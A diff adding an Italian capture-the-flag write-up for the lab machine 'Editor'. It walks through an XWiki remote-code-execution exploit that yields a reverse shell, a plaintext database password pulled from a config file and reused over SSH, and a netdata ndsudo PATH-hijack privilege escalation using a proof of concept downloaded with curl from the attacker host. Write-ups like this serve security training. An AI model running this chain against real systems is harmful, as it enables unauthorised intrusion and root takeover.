@@ -218,3 +218,57 @@ questi comandi vengono eseguiti con i privilegi di root. Esempio tratto dal file
 
 Quindi, avviando npbackup-cli con i permessi concessi da sudo, i comandi in pre_exec_commands vengono eseguiti come root e possono leggere o copiare file sensibili 
 (es. /root/root.txt) o eseguire qualunque comando con privilegi elevati.
+
+################################################################################
+
+#Machine 'Editor'
+IP: 10.10.11.80
+
+La macchina presenta 3 porte aperte 22, 80 e 8080 con ffuf abbiamo trovato un sottodomionio "wiki" che come sulla porta 8080 ci mostra un pannello di XWiki che in fondo alla pagina presenta la sua versione 
+XWiki Debian 15.10.8 che ci conferma la possibilità di exploit. (CVE-2025-24893 – XWiki SolrSearch RCE PoC)
+
+  ┌──(kali㉿kali)-[~]
+  └─$ nc -lvnp 4444
+  listening on [any] 4444 ...
+  connect to [10.10.14.99] from (UNKNOWN) [10.10.11.80] 47356
+  /bin/sh: 0: can't access tty; job control turned off
+  $ whoami
+  xwiki
+  $ which python3
+  /usr/bin/python3
+  $ python3 -c 'import pty; pty.spawn("/bin/bash")'
+  xwiki@editor:/usr/lib/xwiki-jetty$ 
+
+Guardiamo adesso nella ocnfiguration file di xwiki che si trova in /usr/lib/xwiki/WEB-INF dove troveremo all'intenro di hibernate.cfg.xml le credenziali che si riveleranno utili per accedere in ssh
+(L'enum dell'user ci basta controllare allinterno di "cat /etc/passwd" e vedere quale utente ha la shell attiva).
+
+  <property name="hibernate.connection.username">xwiki</property>
+  <property name="hibernate.connection.password">theEd1t0rTeam99</property>
+
+  oliver@editor:~$ cat user.txt 
+  a89a7d5b67455b1ad***************
+
+Controlliamo adesso i permessi di questo utente "find / -type f -perm -4000 -user root 2>/dev/null" e notiamo che c'è la possibilità di utilizzare il plugin /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
+per effettuare privesc, trovando https://github.com/AliElKhatteb/CVE-2024-32019-POC possiamo compilare l'exploit (modificando all'interno i campi IP e PORT) e caricarlo sulla macchina.
+
+  x86_64-linux-gnu-gcc -o nvme exploit.c -static
+  └─$ sudo python3 -m http.server 80      
+
+  oliver@editor:/tmp$ curl 10.10.14.99/nvme -o nvme
+  oliver@editor:/tmp$ chmod +x nvme 
+  
+Ci mettiamo in ascolto sulla macchina kali ed inviamo il comando sulla macchina vuln :
+ 
+  oliver@editor:/tmp$ PATH=$(pwd):$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
+
+  ┌──(kali㉿kali)-[~/HTB/CVE-2024-32019-POC]
+  └─$ nc -lvnp 9001
+  listening on [any] 9001 ...
+  connect to [10.10.14.99] from (UNKNOWN) [10.10.11.80] 35700
+  root@editor:/root# cat root.txt
+  cat root.txt
+  66b08bd127492ddb***************
+
+################################################################################
+  
+
